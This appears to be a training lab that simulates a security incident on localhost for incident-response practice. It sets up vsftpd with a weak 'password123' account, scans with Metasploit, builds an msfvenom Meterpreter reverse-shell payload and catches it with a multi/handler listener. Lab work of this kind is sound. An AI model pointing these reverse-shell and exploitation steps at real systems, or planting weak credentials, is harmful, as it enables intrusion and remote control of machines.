Task 1: Simulate a Security Incident
Step 1: Prepare Vulnerable Services
Set up intentionally vulnerable services for testing:

# Update system and install required packages
sudo apt update
sudo apt install -y metasploit-framework vsftpd apache2

# Start vulnerable FTP service
sudo systemctl start vsftpd
sudo useradd -m ftpuser
echo "ftpuser:password123" | sudo chpasswd

# Start web server
sudo systemctl start apache2
Step 2: Initialize Metasploit Framework
# Start PostgreSQL and initialize Metasploit database
sudo systemctl start postgresql
sudo msfdb init

# Launch Metasploit console
sudo msfconsole
Step 3: Conduct Reconnaissance
Within Metasploit console, scan for vulnerabilities:

# Port scanning
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 127.0.0.1
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21,22,80,443
msf6 auxiliary(scanner/portscan/tcp) > run

# FTP version detection
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 127.0.0.1
msf6 auxiliary(scanner/ftp/ftp_version) > run
Step 4: Execute Exploitation
Create and deploy a test payload:

# Generate malicious payload
msf6 > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/test_payload

# Set up listener
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# In a new terminal, execute payload to simulate compromise
chmod +x /tmp/test_payload
/tmp/test_payload &
Step 5: Document Initial Compromise
Record the following information:

Timestamp of compromise
Attack vector used
Services affected
Initial indicators of compromise (IOCs)
Exit Metasploit when done:

msf6 > sessions -K
msf6 > exit
